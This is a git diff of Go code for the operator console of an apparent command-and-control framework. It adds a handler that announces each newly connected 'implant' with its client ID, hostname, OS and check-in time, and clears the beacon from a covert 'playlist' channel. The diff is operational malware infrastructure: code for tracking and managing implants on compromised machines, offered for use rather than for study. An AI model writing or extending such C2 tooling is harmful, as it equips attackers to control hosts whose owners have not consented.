@@ -85,6 +85,13 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 			}
 			continue
 		}
+		// Handle checkin beacon
+		if module, ok := result["module"].(string); ok && module == "checkin" {
+			displayCheckin(result)
+			_ = op.client.CleanC2Playlists(ctx,
+				protocol.ChannelRes, op.key, seqNum)
+			continue
+		}
 		results[seqNum] = result
 		_ = op.client.CleanC2Playlists(ctx,
 			protocol.ChannelRes, op.key, seqNum)
@@ -229,6 +236,27 @@ func (op *Operator) printStatus() {
 		fmt.Println("[*] No pending commands")
 	}
 	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
+}
+
+func displayCheckin(result map[string]interface{}) {
+	data, _ := result["data"].(string)
+	var info map[string]interface{}
+	if err := json.Unmarshal([]byte(data), &info); err != nil {
+		fmt.Println("\n[+] New implant connected! (could not parse details)")
+		return
+	}
+	clientID, _ := info["client_id"].(string)
+	hostname, _ := info["hostname"].(string)
+	osInfo, _ := info["os"].(string)
+	ts, _ := result["ts"].(float64)
+	timestamp := time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")
+
+	fmt.Printf("\n[+] New implant connected!\n"+
+		"    client_id : %s\n"+
+		"    hostname  : %s\n"+
+		"    os        : %s\n"+
+		"    timestamp : %s\n\n",
+		clientID, hostname, osInfo, timestamp)
 }
 
 func displayResult(seq int, result map[string]interface{}) {
